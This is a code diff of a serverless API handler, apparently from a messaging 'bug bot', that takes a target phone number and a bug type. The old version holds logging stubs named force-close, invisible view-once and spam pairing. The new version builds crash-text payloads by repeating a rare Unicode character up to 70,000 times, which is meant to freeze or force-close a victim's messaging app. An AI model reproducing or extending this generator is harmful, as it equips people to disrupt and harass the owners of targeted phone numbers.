@@ -1,37 +1,53 @@
-export default async function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).json({ message: "Only POST allowed" });
+module.exports = async (req, res) => {
+  const { type, target } = req.query;
 
-  const { target, type } = req.body;
-  console.log(`📲 Trigger received: ${type} → ${target}`);
-
-  if (!target || !type) return res.status(400).json({ message: "Missing target or type" });
-
-  try {
-    if (type === "forceclose") {
-      await DilxForceClose(target);
-    } else if (type === "invisible") {
-      await DilxInvisibleViewOnce(target);
-    } else if (type === "spam") {
-      await DilxSpamPairing(target);
-    } else {
-      return res.status(400).json({ message: "Unknown bug type" });
-    }
-
-    return res.json({ message: "Bug sent!" });
-  } catch (err) {
-    console.error("❌ Error:", err);
-    return res.status(500).json({ message: "Server error", error: err.message });
+  // Semak jika parameter tidak lengkap
+  if (!type || !target) {
+    return res.status(400).json({ 
+      success: false,
+      error: 'Parameter "type" dan "target" diperlukan. Contoh: ?type=xcombo&target=60123456789' 
+    });
   }
-}
 
-async function DilxForceClose(target) {
-  console.log(`💥 DilxForceClose ke ${target}`);
-}
+  // Simbol bug
+  const bugSymbol = "𑲭";
+  let triggerText = '';
 
-async function DilxInvisibleViewOnce(target) {
-  console.log(`👻 DilxInvisibleViewOnce ke ${target}`);
-}
+  // Pilih jenis bug
+  switch (type.toLowerCase()) {
+    case 'xforceclose':
+      triggerText = bugSymbol.repeat(60000);
+      break;
 
-async function DilxSpamPairing(target) {
-  console.log(`🔁 DilxSpamPairing ke ${target}`);
-}
+    case 'xinvisible':
+      triggerText = "InvisibleBug" + bugSymbol.repeat(50000);
+      break;
+
+    case 'xviewonce':
+      triggerText = "🔁VIEWONCE🔁" + bugSymbol.repeat(30000);
+      break;
+
+    case 'xcombo':
+      triggerText = "COMBO🔥" + bugSymbol.repeat(70000);
+      break;
+
+    default:
+      return res.status(400).json({ 
+        success: false,
+        error: 'Jenis bug tidak valid. Gunakan: xforceclose, xinvisible, xviewonce, xcombo' 
+      });
+  }
+
+  // Log ke Vercel console
+  console.log(`[Dilx Trigger] Type: ${type} | Target: ${target} | Length: ${triggerText.length}`);
+
+  // Balas ke pengguna
+  return res.status(200).json({
+    success: true,
+    target,
+    type,
+    triggerLength: triggerText.length,
+    preview: triggerText.slice(0, 100) + '...',
+    message: 'Trigger bug berjaya dijana.'
+  });
+};
